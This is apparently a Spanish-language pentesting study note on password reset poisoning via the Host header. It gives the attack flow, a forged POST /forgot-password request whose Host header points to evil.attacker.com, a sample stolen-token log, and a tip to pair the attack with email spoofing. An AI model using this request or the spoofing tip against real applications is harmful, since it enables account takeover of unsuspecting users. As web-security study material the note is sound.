---
title: Host Header — Password Reset Poisoning
tags: [web, host-header, password-reset, phishing]
---

# Password Reset Poisoning via Host Header

## Descripción

Cuando una aplicación genera URLs de reset de contraseña usando el `Host` header sin validarlo correctamente, un atacante puede hacer que las víctimas reciban links que apuntan al servidor del atacante.

## Flujo de ataque

```
1. Atacante inicia reset de contraseña para victim@company.com
2. Intercepta la petición con Burp
3. Cambia: Host: legit.com → Host: evil.attacker.com
4. La aplicación genera: http://evil.attacker.com/reset?token=ABCD1234
5. Victim@company.com recibe el email con ese link
6. La víctima hace clic → el token llega al servidor del atacante
7. Atacante usa el token para cambiar la contraseña
```

## Request manipulada

```http
POST /forgot-password HTTP/1.1
Host: evil.attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com
```

## Ejemplo de impacto

```
Email recibido por víctima:
  "Click here to reset: http://evil.attacker.com/reset?token=deadbeef"

Log del servidor atacante:
  GET /reset?token=deadbeef HTTP/1.1
```

> [!warning] Esta técnica no requiere que la víctima haga nada excepto clicar en un link de reset "legítimo" de su email.

> [!tip] Combinar con email spoofing para mayor credibilidad.

## Ver también
- [[07-web-hacking/ataques/http-host-header/técnicas|Técnicas Host Header]]
- [[07-web-hacking/ataques/http-host-header/metodología|Metodología Host Header]]
